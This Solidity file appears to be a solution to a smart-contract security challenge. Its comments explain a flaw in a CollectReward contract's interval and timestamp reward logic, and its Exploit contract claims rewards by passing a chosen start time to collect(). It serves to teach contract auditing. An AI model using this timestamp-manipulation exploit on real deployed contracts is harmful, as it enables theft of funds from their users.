// SPDX-License-Identifier:MIT
pragma solidity 0.8.4;

import "./CollectReward.sol";

/**
 * @title How to exploit the CollectReward contract?
 * @notice 1. The CollectReward contract stores the block number for a particular
 * timestamp. Initially in the constructor we set blocks for timestamp
 * starting from the deployment timestamp(i.e. programStartTime) till 9 intervals,
 * with each interval of one day duration (i.e. 86400 seconds).
 * 2. The block numbers in _setBlocks() function is calculated based on average block
 * time of Goerli i.e. 15 seconds. Hence, 86400/15 = 5760.
 * 3. The collect() function internally calls the _getReward() function that
 * runs for a max duration of 3 intervals from the withdrawTime(which can
 * either be programStartTime or _startTime(passed)).
 * 4. The _calculateTimestamp() always rounds off the time to the start of an interval.
 * 5. In the _computeReward() function it is clear that the reward is only
 * calculated when _date == programStartTime + 518400. 518400/86400 =  6. So,
 * programStartTime + 6 intervals, which means the start of the 7th interval.
 * Hence, any _startTime between the start of the 5th interval and end of
 * 7th inteval will fetch rewards.
 * */
contract Exploit {
    constructor(CollectReward instance) payable {
        require(msg.value == 1 ether);
        uint256 startTime = instance.getProgramStartTime();
        instance.collect{value: 1 ether}(startTime + (5 * 86400));
        // This will work for any value of x where x >= (startTime + (5 * 86400))
        // and x < (startTime + (8 * 86400))
    }
}
